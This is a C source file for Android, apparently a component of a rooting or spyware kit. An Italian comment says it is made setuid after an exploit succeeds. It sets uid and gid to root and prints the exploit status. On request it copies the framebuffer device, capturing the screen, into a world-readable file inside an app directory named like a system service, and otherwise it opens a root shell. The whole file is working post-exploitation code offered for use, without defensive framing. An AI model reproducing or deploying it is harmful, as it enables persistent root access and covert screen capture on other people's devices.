#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/time.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <errno.h>
#include <jni.h>
#include <android/log.h>

#define LOG(x)  printf(x)

static int copy(const char *from, const char *to);

// questo file viene compilato come rdb e quando l'exploit funziona viene suiddato

// statuslog -c "/system/bin/cat /dev/graphics/fb0"
int main(int argc, char** argv) {
	seteuid(0);
	setegid(0);
	setuid(0);
	setgid(0);

	char buf[128];
	sprintf(buf, "Exploit Status: EUID: %d, UID: %d\n", geteuid(), getuid());
	LOG(buf);

	if ( argc == 2 && strcmp(argv[1], "fb") == 0) {
		char* filename = "/data/data/com.android.service/files/frame";
		copy("/dev/graphics/fb0", filename);
		chmod("/data/data/com.android.service/files/frame", 0666);
	} else {

		const char * shell = "/system/bin/sh";
		LOG("Starting shell\n");

		char *exec_args[argc + 1];
		exec_args[argc] = NULL;
		exec_args[0] = "sh";
		int i;
		for (i = 1; i < argc; i++) {
			exec_args[i] = argv[i];
		}
		execv("/system/bin/sh", exec_args);

		LOG("Exiting shell\n");
	}

	return 0;
}

static int copy(const char *from, const char *to) {
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0) {
		return -1;
	}

	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf));

		if (r <= 0)
			break;

		if (write(fd2, buf, r) != r)
			break;
	}

	close(fd1);
	close(fd2);

	sync();
	sync();

	return r;
}

